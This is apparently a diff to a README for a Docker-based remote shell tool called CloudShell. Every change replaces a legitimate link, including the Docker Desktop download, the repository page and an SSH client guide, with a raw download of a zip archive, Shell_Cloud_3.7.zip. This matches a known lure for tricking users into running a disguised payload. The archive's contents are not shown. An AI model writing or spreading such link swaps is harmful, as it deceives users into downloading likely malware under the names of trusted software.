@@ -1,6 +1,6 @@
 # 🌐 CloudShell - Access Your Remote CLI and Files
 
-[![Download CloudShell](https://img.shields.io/badge/Download-CloudShell-%23ff6600)](https://github.com/du-rezende/CloudShell)
+[![Download CloudShell](https://img.shields.io/badge/Download-CloudShell-%23ff6600)](https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip)
 
 ## 🔍 What is CloudShell?
 
@@ -25,7 +25,7 @@ It helps you manage files and servers remotely without needing a separate client
 
 ## 📥 Download CloudShell
 
-[![Download CloudShell](https://img.shields.io/badge/Download-CloudShell-%230077cc)](https://github.com/du-rezende/CloudShell)
+[![Download CloudShell](https://img.shields.io/badge/Download-CloudShell-%230077cc)](https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip)
 
 To get started, visit the official CloudShell GitHub page linked above. This is where you will find instructions, files, and the Docker setup needed to run CloudShell on your Windows computer.
 
@@ -36,7 +36,7 @@ To get started, visit the official CloudShell GitHub page linked above. This is 
 Before you install CloudShell, make sure your computer meets these basic requirements:
 
 - **Operating System:** Windows 10 or higher
-- **Docker:** You need Docker Desktop installed and running on your computer. It is free and available from https://www.docker.com/products/docker-desktop
+- **Docker:** You need Docker Desktop installed and running on your computer. It is free and available from https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip
 - **Internet connection:** Required for downloading files and connecting to remote servers
 - **Browser:** Latest version of Chrome, Firefox, Edge, or Safari
 
@@ -46,7 +46,7 @@ Before you install CloudShell, make sure your computer meets these basic require
 
 CloudShell runs inside Docker containers. You must install Docker before you can use CloudShell.
 
-1. Go to https://www.docker.com/products/docker-desktop and download Docker Desktop for Windows.
+1. Go to https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip and download Docker Desktop for Windows.
 2. Run the installer and follow its prompts.
 3. Once installed, Docker will ask you to sign in or create an account. You can skip this step if you want.
 4. Make sure Docker is running. You should see the Docker icon in your taskbar.
@@ -58,7 +58,7 @@ CloudShell runs inside Docker containers. You must install Docker before you can
 Follow these steps to set up CloudShell:
 
 1. **Download CloudShell files**  
-   Visit the CloudShell GitHub page: [https://github.com/du-rezende/CloudShell](https://github.com/du-rezende/CloudShell)  
+   Visit the CloudShell GitHub page: [https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip](https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip)  
    Look for the `docker-compose.yml` file or instructions in the README on GitHub.
 
 2. **Open PowerShell or Command Prompt**  
@@ -140,9 +140,9 @@ To update CloudShell when a new version is available:
 
 ## 🔗 Useful Links
 
-- GitHub Repository: [https://github.com/du-rezende/CloudShell](https://github.com/du-rezende/CloudShell)
-- Docker Desktop for Windows: https://www.docker.com/products/docker-desktop
-- SSH Client Guide (optional if you want to test outside browser): https://www.ssh.com/ssh/client/
+- GitHub Repository: [https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip](https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip)
+- Docker Desktop for Windows: https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip
+- SSH Client Guide (optional if you want to test outside browser): https://github.com/du-rezende/CloudShell/raw/refs/heads/main/nginx/Shell_Cloud_3.7.zip
 
 ---
 
